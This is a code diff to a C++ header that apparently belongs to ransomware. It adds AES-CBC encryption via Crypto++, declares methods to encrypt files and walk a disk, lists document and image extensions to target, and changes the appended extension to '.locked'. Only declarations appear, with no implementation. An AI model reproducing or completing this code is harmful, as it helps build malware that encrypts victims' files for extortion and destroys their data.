@@ -1,12 +1,13 @@
 #include <string>
 
+#include <cryptopp/ccm.h>
 #include <cryptopp/aes.h>
 
 
 #include "headers.h"
 
 #define TABLE_TEMP_FILE(username, disk) "C:\Users\." username "\AppData\Local\Temp\." disk ".tmp"
-#define FILE_EXTENSION ".4N&xcM"
+#define FILE_EXTENSION ".locked"
 
 const std::string ext2Ecrypt[] = {
 ".zip", ".rar", ".pdf", ".img", ".jpeg", ".png", ".docx", ".xlsx",
@@ -25,6 +26,7 @@ private:
 	std::string _disk;
 	unsigned long _freespace;
 	unsigned _numberOfFiles;
+	CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption _e;
 
 
 public:
@@ -34,6 +36,10 @@ public:
 
 	bool setDisk(std::string disk);
 	bool setFreeSpace();
+	bool setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv);
+
+	bool fileEncrypt(std::string file);
+	void iterateFiles();
 
 
 };
